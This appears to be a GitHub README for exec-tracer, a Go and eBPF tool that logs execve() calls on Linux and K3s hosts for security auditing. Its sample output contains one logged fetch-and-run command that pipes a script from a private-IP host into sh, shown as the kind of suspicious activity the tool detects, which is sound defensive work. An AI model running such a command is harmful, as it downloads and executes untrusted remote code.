

## 📦 `exec-tracer`: Lightweight Go + eBPF `execve()` Monitor for K3s and Linux Hosts

> Dependency posture: this is a research helper that requires generated
> `bpf2go` bindings before it builds. Dependency pins may be refreshed, but
> build verification requires running the generation step first.

### 🧠 Overview

`exec-tracer` is a minimalist **eBPF-based syscall monitor** written in **Go** using the [Cilium/ebpf](https://github.com/cilium/ebpf) library. It attaches a **kprobe** to the `execve()` syscall and captures command executions across the system, including inside Kubernetes pods (e.g. K3s workloads). Perfect for building your own:

* 🛡️ Security observability agent
* 🔍 Lightweight audit or forensics layer
* 🧪 Behavior tracker for suspicious pods

---

## 🚀 Features

* ✅ Written in pure Go with embedded C-based eBPF program
* ✅ Uses `bpf2go` to generate Go bindings
* ✅ Captures PID, command name, and invoked binary path (`argv[0]`)
* ✅ Works on K3s, microk8s, or bare-metal Linux
* ✅ No dependencies on Falco, Tetragon, or Tracee

---

## 📁 Directory Structure

```
exec-tracer/
├── main.go             # Go userland loader and logger
├── trace.bpf.c         # eBPF C code that hooks execve()
├── bpf_gen.go          # Generated bindings (from bpf2go)
├── go.mod              # Module config
```

---

## ⚙️ Requirements

* Linux kernel **5.4+** (recommended 5.10+)
* `clang`, `llvm`, and `libelf-dev`
* Docker or bare metal K3s nodes
* Go **1.21+**

---

## 🔧 Setup

### 1. Clone this repo

```bash
git clone https://github.com/yourusername/exec-tracer.git
cd exec-tracer
```

### 2. Install prerequisites

```bash
sudo apt install clang llvm libelf-dev gcc make linux-headers-$(uname -r)
go install github.com/cilium/ebpf/cmd/bpf2go@latest
```

### 3. Generate eBPF bindings

```bash
bpf2go Tracer trace.bpf.c --target amd64
```

This creates `bpf_gen.go` and `.o` ELF binaries.

### 4. Build the tracer

```bash
go build -o exec-tracer .
```

### 5. Run it

```bash
sudo ./exec-tracer
```

---

## 📊 Example Output

```text
[*] Listening for execve() events...
[execve] pid=1441 cmd=bash argv=/bin/bash
[execve] pid=1442 cmd=curl argv=curl -fsSL http://10.0.0.5/x.sh | sh
```

You’ll see real-time command execution including pod-level execs or suspicious binaries invoked by workloads.

---

## 🔐 Running Inside Kubernetes

If you're running K3s:

* Package this as a **privileged DaemonSet**
* Mount `/sys/fs/bpf` and `/proc` as required
* Add nodeSelector or tolerations as needed
* Capture pod metadata via PID namespace mapping (optional advanced)

---

## ✍️ Customizing

| Area                      | How to customize                                                      |
| ------------------------- | --------------------------------------------------------------------- |
| Filter PIDs or containers | Add namespace or cgroup filters in `trace.bpf.c`                      |
| Add syscall arguments     | Extend `event` struct and `bpf_probe_read_user()`                     |
| Output to file / webhook  | Replace `fmt.Printf` with JSON logger, file writer, or HTTP forwarder |
| Export metrics            | Use `prometheus/client_golang` to expose counters                     |

---

## 📦 Roadmap

* [ ] Add JSON logging support
* [ ] Add namespace/container filtering
* [ ] Deployable DaemonSet YAML
* [ ] Optional webhook or Prometheus output
* [ ] Integration with Loki/Grafana stack

---

## 🧠 Why eBPF?

eBPF allows you to run safe, sandboxed programs in the Linux kernel with minimal overhead. It is ideal for:

* Deep observability (syscalls, networking, security)
* Runtime enforcement
* Low-latency tracing without modifying applications

---

## 🛡️ License

MIT — fork, hack, build, and use it however you like. Built for home labs, red teams, and nerds.


